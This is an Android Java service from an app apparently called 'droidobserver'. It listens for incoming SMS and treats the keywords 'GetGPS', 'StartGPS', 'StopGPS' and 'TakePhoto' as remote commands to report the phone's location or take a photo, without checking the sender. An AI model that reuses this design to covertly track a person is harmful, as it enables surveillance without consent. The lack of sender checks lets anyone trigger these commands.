package bullteam.droidobserver;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.Location;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.util.Log;

public class ControllerService extends Service {
	private static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";
	private BroadcastReceiver smsReceiver;
	public Location currentBestLocation;

	@Override
	public void onCreate() {
		super.onCreate();
		Log.d("ControllerService", "Start");
		final IntentFilter filter = new IntentFilter();
		filter.addAction(ACTION);

		this.smsReceiver = new BroadcastReceiver() {

			@Override
			public void onReceive(Context context, Intent intent) {
				if (intent != null && intent.getAction() != null
						&& ACTION.compareToIgnoreCase(intent.getAction()) == 0) {
					Object[] pduArray = (Object[]) intent.getExtras().get(
							"pdus");
					SmsMessage[] messages = new SmsMessage[pduArray.length];
					for (int i = 0; i < pduArray.length; i++) {
						messages[i] = SmsMessage
								.createFromPdu((byte[]) pduArray[i]);
					}
					parseSms(messages[0].getOriginatingAddress(),
							messages[0].getMessageBody());
				}

			}
		};

		this.registerReceiver(this.smsReceiver, filter);
	}

	public void onDestroy() {
		super.onDestroy();

		this.unregisterReceiver(this.smsReceiver);
	}

	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);

	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	private void parseSms(String sender, String msg) {
		Log.d("ControllerSevice", sender + ": " + msg);
		if (msg.equals("GetGPS")) {
			//wysylanie smsa z lokalizacja
			GetLocationService.sendSMS=true;
			if(!GetLocationService.started){
				startService(new Intent(ControllerService.this,
						GetLocationService.class));
			  }
			
		} else if (msg.equals("StartGPS")) {
		  if(!GetLocationService.started){
			startService(new Intent(ControllerService.this,
					GetLocationService.class));
			GetLocationService.started=true;
		  }
		} else if (msg.equals("StopGPS")) {
			stopService(new Intent(ControllerService.this,
					GetLocationService.class));
			GetLocationService.started=false;
		} else if (msg.equals("TakePhoto")) {
			startActivity(new Intent(ControllerService.this,
					SendFileActivity.class)
					.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
		}
	}
}
